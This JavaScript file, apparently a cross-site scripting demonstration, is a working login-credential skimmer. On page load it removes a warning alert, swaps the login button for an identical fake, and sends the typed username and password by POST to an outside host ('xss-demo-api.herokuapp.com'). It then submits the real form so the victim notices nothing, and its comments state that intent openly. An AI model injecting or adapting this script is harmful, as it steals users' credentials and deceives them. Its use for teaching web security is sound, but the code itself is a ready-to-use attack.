/**
 * The MIT License (MIT)
 * Copyright © 2021 <copyright holders>
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated 
 * documentation files (the “Software”), to deal in the Software without restriction, including without limitation 
 * the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, 
 * and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all copies or substantial portions 
 * of the Software.
 * 
 * THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED 
 * TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL 
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF 
 * CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
 * IN THE SOFTWARE.
 * 
 * getElementsByClassNames by barrcodes @ jsfiddle: https://jsfiddle.net/barrcodes/zjm7nL4r/18/
 * 
 * Gets element(s) that match ALL of the specified class names in a whitespace delimited string
 *
 * @param classNames a string representing all the class names for an element defined in its class="" attribute
 * @param root a root element to search within. Defaults to the document.
 */
 const getElementsByClassNames = function (classNames, root) {
    if (!root) {
        root = document;
    }
    var elementsByClassName = {};
    var allElements = [];
    classNames.forEach(function (className) {
        var elements = Array.from(root.getElementsByClassName(className));
        elementsByClassName[className] = elements;
        allElements.push.apply(allElements, elements);
    });
    var distinct = function (value, index, self) {
        return self.indexOf(value) === index;
    };
    allElements = allElements.filter(distinct);
    return allElements.filter(function (element) {
        var include = true;
        for (var className in elementsByClassName) {
            if (!elementsByClassName[className].includes(element)) {
                include = false;
                break;
            }
        }
        return include;
    });
};

/**
 * Gets the form field children of the login form
 * @param form the form field to parse
 */
getFormFields = (form) => {
    return Array.from(form.children).reduce((acc, curr, i, arr) => {
        if (!curr || !curr.attributes || !curr.attributes.type) {
            return acc;
        }
        
        switch (curr.attributes.type.value) {
            case 'text':
                acc.user = curr;
            case 'password':
                acc.pass = curr;
            case 'submit':
                acc.submit = curr;
        }

        return acc;
    }, {});
}

/**
 * Runs the following script when the window has finished loading
 */
window.onload = function onWindowLoad() { 
    // remove the alert box. its presence on the page may cause the user to suspect something is wrong.
    const alertBox = getElementsByClassNames(['alert', 'alert-box'])[0];
    alertBox.remove();

    // get the login form and fields
    const form = document.getElementById('login');
    const formFields = getFormFields(form);

    // remove the form submit button, which would cause the page to refresh
    formFields.submit.remove();

    // add a dummy button that looks exactly like the real login button
    formFields.submit = document.createElement('button');
    formFields.submit.classList.add('button', 'small');
    formFields.submit.innerHTML = "LOG IN";
    form.appendChild(formFields.submit);

    // do something malicious with their login information
    formFields.submit.onclick = async (event) => {
        event.preventDefault();

        await fetch('https://xss-demo-api.herokuapp.com/users', {
            method: 'POST',
            body: JSON.stringify({
                username: formFields.user.value,
                password: formFields.pass.value,
            }),
            headers: {
                'Content-type': 'application/json; charset=UTF-8'
            }
        });

        // continue with form submission. user won't know that any malicious code was run.
        form.submit();
    }
} 
